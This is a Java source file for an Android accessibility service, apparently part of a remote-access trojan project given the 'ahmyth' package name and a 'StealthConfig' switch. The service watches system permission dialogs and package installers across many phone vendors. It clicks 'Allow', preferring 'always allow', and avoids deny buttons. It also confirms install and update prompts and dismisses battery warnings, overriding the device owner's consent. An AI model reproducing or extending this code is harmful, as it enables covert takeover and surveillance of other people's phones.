package ahmyth.mine.king.ahmyth;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * Accessibility service that automatically grants permissions
 * by detecting permission dialogs and clicking "Allow" buttons
 * 
 * Also handles:
 * - Auto-starting after reboot
 * - Auto-clicking install/update prompts
 * - Auto-dismissing battery optimization warnings
 */
public class PermissionGranterService extends AccessibilityService {
    
    private static final String TAG = "PermGrant";
    private static PermissionGranterService instance = null;
    
    // Track last clicked node to avoid repeated clicks
    private String lastClickedId = "";
    private long lastClickTime = 0;
    private static final long CLICK_COOLDOWN_MS = 500;
    
    // Keywords to identify grant/allow buttons across different languages and Android versions
    // Priority order: prefer "always allow" or "while using" over "only this time"
    private static final String[] ALLOW_KEYWORDS_PREFERRED = {
        // Preferred options (always allow / while using app)
        "always allow", "allow always", "while using", "while using the app", 
        "allow when app running", "allow when using", "allow all the time",
        "grant always", "permit always", "allow anyway",
    };
    
    private static final String[] ALLOW_KEYWORDS = {
        // English
        "allow", "grant", "permit", "accept", "yes", "ok", "okay", "continue",
        "only this time", "allow all", "allow this", "start", "enable", "turn on", "activate",
        "install", "update", "open", "got it", "done", "next", "agree",
        
        // Polish
        "zezwól", "pozwól", "tak", "akceptuj", "kontynuuj", "włącz",
        "podczas używania", "tylko tym razem", "zawsze zezwalaj",
        
        // German
        "erlauben", "zulassen", "ja", "akzeptieren", "weiter", "aktivieren",
        
        // French
        "autoriser", "permettre", "oui", "accepter", "continuer", "activer",
        
        // Spanish
        "permitir", "aceptar", "sí", "continuar", "activar", "habilitar",
        
        // Russian
        "разрешить", "да", "принять", "продолжить", "включить",
        
        // Chinese
        "允许", "同意", "确定", "继续", "是", "好",
        
        // Japanese
        "許可", "はい", "許可する", "同意する",
        
        // Korean
        "허용", "예", "확인", "계속",
        
        // Portuguese
        "permitir", "sim", "aceitar", "continuar"
    };
    
    // Resource IDs that commonly contain allow/grant buttons
    private static final String[] ALLOW_RESOURCE_IDS = {
        "permission_allow_button",
        "permission_allow_foreground_only_button",
        "permission_allow_always_button",
        "permission_allow_one_time_button",
        "continue_button",
        "allow_button",
        "positive_button",
        "button1",
        "ok_button",
        "accept_button",
        "grant_button"
    };
    
    // Package names of system permission dialogs and installers
    private static final String[] PERMISSION_PACKAGES = {
        "com.android.packageinstaller",
        "com.google.android.packageinstaller", 
        "com.android.permissioncontroller",
        "com.google.android.permissioncontroller",
        // Samsung
        "com.samsung.android.permissioncontroller",
        "com.samsung.android.packageinstaller",
        // Xiaomi/MIUI
        "com.miui.securitycenter",
        "com.miui.permcenter",
        // OPPO/ColorOS
        "com.coloros.safecenter",
        "com.oppo.safe",
        // Vivo
        "com.vivo.permissionmanager",
        // Huawei
        "com.huawei.systemmanager",
        // OnePlus
        "com.oneplus.security"
        // NOTE: "android" removed - it matches EVERYTHING and causes issues
    };
    
    // Packages to dismiss (e.g., battery optimization dialogs)
    private static final String[] DISMISS_PACKAGES = {
        "com.android.settings"
    };
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Log.d(TAG, "Service created");
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        Log.d(TAG, "Service destroyed");
    }
    
    public static PermissionGranterService getInstance() {
        return instance;
    }
    
    public static boolean isServiceEnabled(Context context) {
        try {
            String serviceName = context.getPackageName() + "/" + PermissionGranterService.class.getName();
            String enabledServices = Settings.Secure.getString(
                context.getContentResolver(), 
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            return enabledServices != null && enabledServices.contains(serviceName);
        } catch (Exception e) {
            return false;
        }
    }
    
    public static void openAccessibilitySettings(Context context) {
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Error opening accessibility settings", e);
        }
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!StealthConfig.USE_ACCESSIBILITY_GRANTER) {
            return;
        }
        
        if (event == null) return;
        
        String packageName = event.getPackageName() != null ? 
            event.getPackageName().toString() : "";
        
        // Log for debugging
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            Log.d(TAG, "Window changed: " + packageName);
        }
        
        // Check if this is a permission dialog - must be exact match or specific substring
        boolean isPermissionDialog = false;
        for (String pkg : PERMISSION_PACKAGES) {
            if (packageName.equals(pkg) || 
                packageName.contains(".permissioncontroller") ||
                packageName.contains(".packageinstaller") ||
                packageName.contains(".permcenter")) {
                isPermissionDialog = true;
                Log.d(TAG, "Permission dialog detected from: " + packageName);
                break;
            }
        }
        
        // Also handle settings app (for battery optimization, etc.)
        boolean isDismissable = false;
        for (String pkg : DISMISS_PACKAGES) {
            if (packageName.equals(pkg)) {
                isDismissable = true;
                break;
            }
        }
        
        // IMPORTANT: Only process permission dialogs, not regular app windows
        if (!isPermissionDialog && !isDismissable) {
            // Log skipped packages for debugging
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                Log.d(TAG, "Skipping non-permission package: " + packageName);
            }
            return;
        }
        
        Log.d(TAG, "Permission/settings dialog detected: " + packageName);
        
        // Add a small delay to ensure dialog is fully rendered before clicking
        final boolean isPermDialog = isPermissionDialog;
        final boolean isDismiss = isDismissable;
        android.os.Handler handler = new android.os.Handler(android.os.Looper.getMainLooper());
        handler.postDelayed(() -> {
            // Try to find and click the allow button
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                if (isPermDialog) {
                    // Clear previous results
                    foundAllowButtons.clear();
                    foundButtonTexts.clear();
                    // Collect all buttons first
                    collectAllowButtons(rootNode, 0);
                    // Then click the best one
                    clickBestAllowButton();
                } else if (isDismiss) {
                    findAndClickDismissButton(rootNode, 0);
                }
                rootNode.recycle();
            }
        }, 500); // Wait 500ms for dialog to fully render
    }
    
    // Store found buttons to prioritize preferred ones
    private java.util.List<AccessibilityNodeInfo> foundAllowButtons = new java.util.ArrayList<>();
    private java.util.List<String> foundButtonTexts = new java.util.ArrayList<>();
    
    // Collect all allow buttons from the dialog
    private void collectAllowButtons(AccessibilityNodeInfo node, int depth) {
        if (node == null || depth > 20) return;
        
        String text = node.getText() != null ? node.getText().toString().trim() : "";
        String textLower = text.toLowerCase();
        String contentDesc = node.getContentDescription() != null ? 
            node.getContentDescription().toString().trim() : "";
        String contentDescLower = contentDesc.toLowerCase();
        String viewId = node.getViewIdResourceName() != null ? 
            node.getViewIdResourceName().toLowerCase() : "";
        String className = node.getClassName() != null ? 
            node.getClassName().toString() : "";
        
        // Skip deny buttons
        boolean isDenyButton = false;
        String[] denyKeywords = {"deny", "don't allow", "don't", "never allow", "always disallow", 
                                 "reject", "no", "cancel", "dismiss", "disallow"};
        for (String keyword : denyKeywords) {
            if (textLower.contains(keyword) || contentDescLower.contains(keyword)) {
                isDenyButton = true;
                break;
            }
        }
        if (isDenyButton) {
            // Continue searching children
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    collectAllowButtons(child, depth + 1);
                    child.recycle();
                }
            }
            return;
        }
        
        // Check if this is an allow button
        boolean isAllowButton = false;
        
        // Check preferred keywords first
        for (String keyword : ALLOW_KEYWORDS_PREFERRED) {
            if (textLower.contains(keyword) || contentDescLower.contains(keyword)) {
                isAllowButton = true;
                break;
            }
        }
        
        // Check regular allow keywords
        if (!isAllowButton) {
            for (String keyword : ALLOW_KEYWORDS) {
                if (textLower.contains(keyword) || contentDescLower.contains(keyword)) {
                    isAllowButton = true;
                    break;
                }
            }
        }
        
        // Check by resource ID
        if (!isAllowButton) {
            for (String resourceId : ALLOW_RESOURCE_IDS) {
                if (viewId.contains(resourceId)) {
                    isAllowButton = true;
                    break;
                }
            }
        }
        
        // Check for button-like classes
        boolean isButtonLike = className.contains("Button") || 
                               className.contains("MaterialButton") ||
                               className.contains("AppCompatButton");
        
        // Collect allow buttons
        if (isAllowButton && (node.isClickable() || isButtonLike)) {
            AccessibilityNodeInfo nodeCopy = AccessibilityNodeInfo.obtain(node);
            foundAllowButtons.add(nodeCopy);
            foundButtonTexts.add(text);
            Log.d(TAG, "Found allow button: text='" + text + "' id='" + viewId + "'");
        }
        
        // Recursively check children
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                collectAllowButtons(child, depth + 1);
                child.recycle();
            }
        }
    }
    
    // Click the best allow button (prefer "always allow" or "while using" over "only this time")
    private void clickBestAllowButton() {
        if (foundAllowButtons.isEmpty()) {
            Log.d(TAG, "No allow buttons found");
            return;
        }
        
        // Find the best button based on priority
        int bestIndex = -1;
        int bestPriority = -1;
        
        for (int i = 0; i < foundAllowButtons.size(); i++) {
            String buttonText = foundButtonTexts.get(i).toLowerCase();
            int priority = 0;
            
            // Highest priority (2): always allow / while using
            for (String keyword : ALLOW_KEYWORDS_PREFERRED) {
                if (buttonText.contains(keyword)) {
                    priority = 2;
                    break;
                }
            }
            
            // Lower priority (1): only this time
            if (priority == 0 && (buttonText.contains("only this time") || 
                                  buttonText.contains("just once") ||
                                  buttonText.contains("one time"))) {
                priority = 1;
            }
            
            // Default priority (0): any other allow button
            
            if (priority > bestPriority) {
                bestPriority = priority;
                bestIndex = i;
            }
        }
        
        // Click the best button
        if (bestIndex >= 0) {
            AccessibilityNodeInfo bestButton = foundAllowButtons.get(bestIndex);
            String buttonText = foundButtonTexts.get(bestIndex);
            String nodeId = (bestButton.getViewIdResourceName() != null ? 
                bestButton.getViewIdResourceName().toLowerCase() : "") + buttonText;
            long now = System.currentTimeMillis();
            
            if (!nodeId.equals(lastClickedId) || (now - lastClickTime) > CLICK_COOLDOWN_MS) {
                Log.d(TAG, "Clicking best allow button: text='" + buttonText + "' priority=" + bestPriority);
                
                // Try clicking the button
                if (bestButton.isClickable()) {
                    boolean clicked = bestButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.d(TAG, "Clicked button directly: " + clicked);
                    if (clicked) {
                        lastClickedId = nodeId;
                        lastClickTime = now;
                    }
                } else {
                    // Try parent
                    AccessibilityNodeInfo parent = bestButton.getParent();
                    if (parent != null && parent.isClickable()) {
                        boolean clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.d(TAG, "Clicked parent: " + clicked);
                        if (clicked) {
                            lastClickedId = nodeId;
                            lastClickTime = now;
                        }
                        parent.recycle();
                    }
                }
            }
        }
        
        // Clean up
        for (AccessibilityNodeInfo btn : foundAllowButtons) {
            btn.recycle();
        }
        foundAllowButtons.clear();
        foundButtonTexts.clear();
    }
    
    private void findAndClickDismissButton(AccessibilityNodeInfo node, int depth) {
        if (node == null || depth > 15) return;
        
        String text = node.getText() != null ? node.getText().toString().toLowerCase().trim() : "";
        String viewId = node.getViewIdResourceName() != null ? 
            node.getViewIdResourceName().toLowerCase() : "";
        
        // Look for dismiss-type buttons for battery dialogs, etc.
        boolean isDismissButton = text.contains("allow") || 
                                   text.contains("ok") || 
                                   text.contains("yes") ||
                                   text.contains("done") ||
                                   text.contains("got it") ||
                                   viewId.contains("allow") ||
                                   viewId.contains("button1") ||
                                   viewId.contains("positive");
        
        if (isDismissButton && node.isClickable()) {
            Log.d(TAG, "Clicking dismiss button: " + text);
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return;
        }
        
        // Recursively check children
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                findAndClickDismissButton(child, depth + 1);
                child.recycle();
            }
        }
    }
    
    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }
    
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Permission granter service connected");
        instance = this;
        
        // Configure the service
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | 
                          AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
                          AccessibilityEvent.TYPE_VIEW_CLICKED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        
        // Monitor all packages for permission dialogs
        // info.packageNames = null; // null means all packages
        
        setServiceInfo(info);
        
        // Notify that service is ready
        Log.d(TAG, "Accessibility service fully configured");
    }
}
